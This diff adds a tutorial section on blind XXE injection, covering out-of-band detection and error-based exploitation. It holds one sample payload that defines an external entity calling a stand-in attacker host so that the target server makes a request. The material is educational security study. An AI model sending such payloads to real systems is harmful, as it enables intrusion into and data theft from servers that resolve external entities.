@@ -43,5 +43,18 @@ In the following XXE example, the external entity will cause the server to make 
 ```
 
 ## Exploiting blind XXE exfiltrate data out-of-band
+Blind XXE vulnerabilities arise where the application is vulnerable to XXE injection but does not return the values of any defined external entities within its responses. This means that direct retrieval of server-side files is not possible, and so blind XXE is generally harder to exploit than regular XXE vulnerabilities.
+There are two broad ways in which you can find and exploit blind XXE vulnerabilities:
+    - You can trigger out-of-band network interactions, sometimes exfiltrating sensitive data within the interaction data.
+    - You can trigger XML parsing errors in such a way that the error messages contain sensitive data.
+
+### Detecting blind XXE using out-of-band (OAST) techniques
+You can often detect blind XXE using the same technique as for XXE SSRF attacks but triggering the out-of-band network interaction to a system that you control. For example, you would define an external entity as follows:
+```
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
+```
+You would then make use of the defined entity in a data value within the XML.
+
+This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful.
 
 ## Exploiting blind XXE to retrieve data via error messages
